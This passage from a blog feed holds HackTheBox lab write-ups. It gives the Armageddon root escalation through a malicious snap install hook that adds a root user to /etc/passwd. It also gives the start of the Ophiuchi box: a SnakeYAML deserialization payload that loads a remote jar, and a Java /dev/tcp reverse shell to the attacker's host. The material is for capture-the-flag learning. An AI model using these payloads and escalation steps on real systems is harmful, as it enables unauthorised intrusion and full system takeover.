&lt;span class="code-line"&gt;1g 0:00:00:00 DONE (2021-04-25 11:04) 1.960g/s 470.5p/s 470.5c/s 470.5C/s tiffany..chris&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can use SSH to connect to the machine as this user and grab the first flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh brucetherealadmin@10.129.48.89&lt;/span&gt;
&lt;span class="code-line"&gt;brucetherealadmin@10.129.48.89&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Sat May 15 10:05:01 2021 from 10.10.14.17&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon ~]$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon ~]$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon ~]$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;bcb2084548c43514b5451c42c480bf9f&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We take a look at our privileges and found that we can run &lt;code&gt;snap install&lt;/code&gt; as
&lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[brucetherealadmin@armageddon ~]$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for brucetherealadmin on armageddon:&lt;/span&gt;
&lt;span class="code-line"&gt;    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&amp;quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;    env_keep+=&amp;quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User brucetherealadmin may run the following commands on armageddon:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/snap install *&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;According to &lt;a href="https://gtfobins.github.io/gtfobins/snap/"&gt;gtfobins&lt;/a&gt; we can easily
use that to run commands as root using
&lt;a href="https://github.com/jordansissel/fpm"&gt;fpm&lt;/a&gt; to create a snap file.&lt;/p&gt;
&lt;p&gt;We install fpm on our kali box &lt;code&gt;sudo gem install --no-document fpm&lt;/code&gt;.
We build a snap on our machine using &lt;code&gt;fmp&lt;/code&gt; and the command on &lt;a href="https://gtfobins.github.io/gtfobins/snap/"&gt;gtfobins&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ COMMAND=id&lt;/span&gt;
&lt;span class="code-line"&gt;cd $(mktemp -d)&lt;/span&gt;
&lt;span class="code-line"&gt;mkdir -p meta/hooks&lt;/span&gt;
&lt;span class="code-line"&gt;printf &amp;#39;#!/bin/sh\n%s; false&amp;#39; &amp;quot;$COMMAND&amp;quot; &amp;gt;meta/hooks/install&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x meta/hooks/install&lt;/span&gt;
&lt;span class="code-line"&gt;fpm -n test -s dir -t snap -a all meta&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using &lt;code&gt;scp&lt;/code&gt; we upload the snap file to the box and "install" it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[brucetherealadmin@armageddon tmp.Y8rUvO3A58]$ sudo /usr/bin/snap install test_1.0_all.snap --dangerous --devmode&lt;/span&gt;
&lt;span class="code-line"&gt;error: cannot perform the following tasks:&lt;/span&gt;
&lt;span class="code-line"&gt;- Run install hook of &amp;quot;test&amp;quot; snap if present (run hook &amp;quot;install&amp;quot;: uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We change the command to display the root flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ COMMAND=&amp;#39;cat /root/root.txt&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;cd $(mktemp -d)&lt;/span&gt;
&lt;span class="code-line"&gt;mkdir -p meta/hooks&lt;/span&gt;
&lt;span class="code-line"&gt;printf &amp;#39;#!/bin/sh\n%s; false&amp;#39; &amp;quot;$COMMAND&amp;quot; &amp;gt;meta/hooks/install&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x meta/hooks/install&lt;/span&gt;
&lt;span class="code-line"&gt;fpm -n test -s dir -t snap -a all meta&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Created package {:path=&amp;gt;&amp;quot;test_1.0_all.snap&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon tmp.CR7TIBjISj]$ sudo /usr/bin/snap install test_1.0_all.snap --dangerous --devmode&lt;/span&gt;
&lt;span class="code-line"&gt;error: cannot perform the following tasks:&lt;/span&gt;
&lt;span class="code-line"&gt;- Run install hook of &amp;quot;test&amp;quot; snap if present (run hook &amp;quot;install&amp;quot;: 59303daefd76582a8731bbc25b7b9c47)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We want a root shell an not just to display the flag. As we can run any command as root we have a few choices:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Add a root (id 0) user to &lt;code&gt;/etc/passwd&lt;/code&gt; with a password of our choice&lt;/li&gt;
&lt;li&gt;Add an ssh key to root&lt;/li&gt;
&lt;li&gt;run a reverse shell&lt;/li&gt;
&lt;li&gt;a few others&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We will go with the first one. On our kali we use &lt;code&gt;openssl&lt;/code&gt; to generate a hashed password&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openssl passwd -1 -salt ignite pass123&lt;/span&gt;
&lt;span class="code-line"&gt;$1$ignite$LcHWKSHaZ8KUa68dh14V6.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We change our install hook command to add to &lt;code&gt;/etc/passwd&lt;/code&gt;, regenerate the
snap and copy it to the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ cat meta/hooks/install&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;#39;toto2:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&amp;#39;&amp;gt;&amp;gt;/etc/passwd; false&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;┌──(kali㉿kali)-[/tmp/tmp.podJijQ4NH]&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ fpm -n test2 -s dir -t snap -a all meta&lt;/span&gt;
&lt;span class="code-line"&gt;Created package {:path=&amp;gt;&amp;quot;test2_1.0_all.snap&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ scp test2_1.0_all.snap brucetherealadmin@10.129.48.89:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We install the snap on the box which create the &lt;code&gt;toto2&lt;/code&gt; user and we can switch
to it to get a root shell and grab the root flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install test2_1.0_all.snap --dangerous --devmode&lt;/span&gt;
&lt;span class="code-line"&gt;error: cannot perform the following tasks:&lt;/span&gt;
&lt;span class="code-line"&gt;- Run install hook of &amp;quot;test2&amp;quot; snap if present (run hook &amp;quot;install&amp;quot;: exit status 1)&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon ~]$ cat /etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:1:1:bin:/bin:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:2:2:daemon:/sbin:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;adm:x:3:4:adm:/var/adm:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:5:0:sync:/sbin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown&lt;/span&gt;
&lt;span class="code-line"&gt;halt:x:7:0:halt:/sbin:/sbin/halt&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:12:mail:/var/spool/mail:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;operator:x:11:0:operator:/root:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:12:100:games:/usr/games:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:99:99:Nobody:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;dbus:x:81:81:System message bus:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;polkitd:x:999:998:User for polkitd:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;postfix:x:89:89::/var/spool/postfix:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;toto2:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;[brucetherealadmin@armageddon ~]$ su toto2&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;[root@armageddon brucetherealadmin]# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&lt;/span&gt;
&lt;span class="code-line"&gt;[root@armageddon brucetherealadmin]# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;59303daefd76582a8731bbc25b7b9c47&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="Drupalgeddon"></category></entry><entry><title>HTB: Ophiuchi</title><link href="https://maggick.fr/2021/07/htb-ophiuchi.html" rel="alternate"></link><published>2021-07-05T09:15:00+02:00</published><updated>2021-07-05T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-07-05:/2021/07/htb-ophiuchi.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ophiuchi card" class="align-left" src="/media/2021.07/ophiuchi_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/315"&gt;Ophiuchi&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos&lt;/a&gt; and publish on
February 13, 2021.
This box is classified as a medium machine. The user part involves YAML and
deserialization as the root part involves webassembly binaries.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.07/ophiuchi_card.png" alt="Ophiuchi card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/315"&gt;Ophiuchi&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos&lt;/a&gt; and publish on
February 13, 2021.
This box is classified as a medium machine. The user part involves YAML and
deserialization as the root part involves webassembly binaries.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="reco"&gt;Reco&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH) and 8080 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Feb 20 04:02:47 2021 as: nmap -oN notes -sS -p- 10.129.98.255&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.98.255&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http-proxy&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sat Feb 20 04:03:22 2021 -- 1 IP address (1 host up) scanned in 35.41 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The web page is an Online YAML Parser. We quickly guess that this would be about
YAML deserialization. A few "random" data generate a Java stack trace indicating
the use of the Snake YAML library.&lt;/p&gt;
&lt;p&gt;A Google search lead us to a
&lt;a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858"&gt;medium article about exploiting YAML deserialization&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We run an python http server and use the following payload&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!!javax.script.ScriptEngineManager [&lt;/span&gt;
&lt;span class="code-line"&gt;  !!java.net.URLClassLoader [[&lt;/span&gt;
&lt;span class="code-line"&gt;    !!java.net.URL [&amp;quot;http://10.10.14.16:8000&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;  ]]&lt;/span&gt;
&lt;span class="code-line"&gt;]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Despite the "error" message on the website we still got a hit on our Python
HTTP server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python3 -m http.server&lt;/span&gt;
&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:25:51] &amp;quot;GET / HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A link in the &lt;a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858"&gt;medium article&lt;/a&gt;
lead us to a &lt;a href="https://github.com/artsploit/yaml-payload"&gt;github repository for a YAML payloads generator&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We change the paylaod to &lt;code&gt;Runtime.getRuntime().exec("wget http://10.10.14.16:8000/boom");&lt;/code&gt;
and send it to the YAML parser&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!!javax.script.ScriptEngineManager [&lt;/span&gt;
&lt;span class="code-line"&gt;  !!java.net.URLClassLoader [[&lt;/span&gt;
&lt;span class="code-line"&gt;    !!java.net.URL [&amp;quot;http://10.10.14.16:8000/yaml-payload.jar&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;  ]]&lt;/span&gt;
&lt;span class="code-line"&gt;]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got an other Java error "java.lang.UnsupportedClassVersionError: artsploit/AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 60.0), this version of the Java Runtime only recognizes class file versions up to 55.0".&lt;/p&gt;
&lt;p&gt;On my Kali Linux I am using &lt;code&gt;openjdk&lt;/code&gt; with Java 16 so our &lt;code&gt;javac&lt;/code&gt; produced a
newer version of the code.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/lib/jvm/java-16-openjdk-amd64/bin/javac&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We just install Java 11 using &lt;code&gt;sudo apt-get install openjdk-11-jdk&lt;/code&gt;
and run the specific Java 11 compiler. Then we got a hit with our "second" payload&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ /usr/lib/jvm/java-11-openjdk-amd64/bin/javac src/artsploit/AwesomeScriptEngineFactory.java&lt;/span&gt;
&lt;span class="code-line"&gt;Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ jar -cvf yaml-payload.jar -C src/ .&lt;/span&gt;
&lt;span class="code-line"&gt;Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true&lt;/span&gt;
&lt;span class="code-line"&gt;added manifest&lt;/span&gt;
&lt;span class="code-line"&gt;adding: artsploit/(in = 0) (out= 0)(stored 0%)&lt;/span&gt;
&lt;span class="code-line"&gt;adding: artsploit/AwesomeScriptEngineFactory.class(in = 1620) (out= 680)(deflated 58%)&lt;/span&gt;
&lt;span class="code-line"&gt;adding: artsploit/AwesomeScriptEngineFactory.java(in = 1493) (out= 404)(deflated 72%)&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring entry META-INF/&lt;/span&gt;
&lt;span class="code-line"&gt;adding: META-INF/services/(in = 0) (out= 0)(stored 0%)&lt;/span&gt;
&lt;span class="code-line"&gt;adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ python3 -m http.server&lt;/span&gt;
&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /yaml-payload.jar HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /yaml-payload.jar HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] code 404, message File not found&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /boom HTTP/1.1&amp;quot; 404 -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We modify it to use the reverse shell Java payload from
&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java"&gt;Payload all the things&lt;/a&gt;
and catch the new exception in the Java code as shown in the code block below.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.14.16/4242;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;InterruptedException&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running it give us a reverse shell as the &lt;code&gt;tomcat&lt;/code&gt; user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc -l -p 4242&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="stored-credential"&gt;Stored credential&lt;/h2&gt;
&lt;p&gt;We start enumerating and found out that the user is probably &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;tomcat:x:1001:1001::/opt/tomcat:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;admin:x:1000:1000:,,,:/home/admin:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When looking at the directories, we found a &lt;code&gt;conf&lt;/code&gt; folder containing the
&lt;code&gt;tomcat-users.xml&lt;/code&gt; file. This file classically store the user that can access
the tomcat manager panel (which is not exposed on this box).&lt;/p&gt;
